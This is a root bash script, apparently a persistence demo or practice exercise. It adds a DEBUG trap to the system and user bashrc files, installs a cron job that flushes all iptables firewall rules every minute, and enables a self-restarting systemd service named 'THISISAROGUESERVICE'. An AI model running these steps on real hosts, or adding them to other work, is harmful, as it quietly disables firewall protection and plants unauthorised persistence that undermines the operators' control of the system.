#!/bin/bash

# Ensure the script is run as root
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root." 
   exit 1
fi

echo "[+] Setting up a permanent trap in Bash..."

# Add a DEBUG trap to /etc/bash.bashrc (affects all users)
echo 'trap "echo -e \"\nthis is a trap\n\"" DEBUG' >> /etc/bash.bashrc

# Also apply it to the current user's ~/.bashrc (affects only the current user)
echo 'trap "echo -e \"\nthis is a trap\n\"" DEBUG' >> ~/.bashrc

echo "[+] Persistent trap added! Open a new terminal or run 'source ~/.bashrc' to activate."

echo "[+] Adding a cron job to flush iptables every minute..."

# Write the cron job to /etc/cron.d/flush_iptables
echo "* * * * * root /sbin/iptables -F" > /etc/cron.d/flush_iptables
chmod 644 /etc/cron.d/flush_iptables
systemctl restart crond  # Restart cron service to apply changes

echo "[+] Creating the rogue systemd service..."

# Define the rogue systemd service
cat <<EOF > /etc/systemd/system/THISISAROGUESERVICE.service
[Unit]
Description=Rogue Service
After=network.target

[Service]
ExecStart=/bin/bash -c 'while true; do echo "I am rogue!" >> /tmp/rogue.log; sleep 10; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd to recognize the new service
systemctl daemon-reload

# Enable and start the rogue service
systemctl enable THISISAROGUESERVICE
systemctl start THISISAROGUESERVICE

echo "[+] Rogue service THISISAROGUESERVICE started!"

exit 0
